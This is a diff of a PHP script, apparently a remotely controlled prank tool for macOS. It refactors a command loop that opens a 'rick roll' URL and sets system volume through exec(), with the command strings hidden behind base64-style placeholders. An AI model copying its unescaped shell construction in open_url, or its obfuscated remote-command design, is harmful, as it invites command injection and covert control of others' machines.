@@ -90,8 +90,8 @@ do {
         if (preg_match(REGEX_CTL_QUIT, $buf)) {
             break;
         } else if (preg_match(REGEX_CTL_RICK_ROLL, $buf)) {
-            $cmd = '{{B64_CMD_OPEN}}' . ' "' . '{{B64_STR_RICK_ROLL_URL}}' . '"';
-            exec($cmd);
+            set_volume(7);
+            open_url('{{B64_STR_RICK_ROLL_URL}}');
         } else if (preg_match(REGEX_CTL_VOICES, $buf)) {
             foreach ($voices as $voice) {
                 $msg .= $voice . "\n";
@@ -110,13 +110,7 @@ do {
             $msg .= '{{B64_STR_CURRENT_VOICE}}' . " $current_voice\n";
         } else if (preg_match(REGEX_CTL_VOLUME, $buf, $arr)) {
             if (isset($arr[1]) && is_numeric($arr[1])) {
-                $lvl = (int)$arr[1];
-
-                if ($lvl > 9) $lvl = 9;
-                if ($lvl < 0) $lvl = 0;
-
-                $cmd = '{{B64_CMD_OSASCRIPT}}' . ' "' . '{{B64_CMD_SET_VOLUME}}' . ' ' . $lvl . '"';
-                exec($cmd);
+                set_volume($arr[1]);
             }
         } else if (preg_match(REGEX_SIMPLE_STRING, $buf)) {
             if (!command_exist($buf)) {
@@ -210,4 +204,21 @@ function build_curl_cmd($page = 'm') {
     }
 
     return false;
+}
+
+function open_url($url) {
+    $cmd = '{{B64_CMD_OPEN}}' . "'$url'";
+    exec($cmd);
+}
+
+function set_volume($lvl) {
+    if (is_numeric($lvl)) {
+        $lvl = (int)$lvl;
+
+        if ($lvl > 9) $lvl = 9;
+        if ($lvl < 0) $lvl = 0;
+
+        $cmd = '{{B64_CMD_OSASCRIPT}}' . ' "' . '{{B64_CMD_SET_VOLUME}}' . ' ' . $lvl . '"';
+        exec($cmd);
+    }
 }
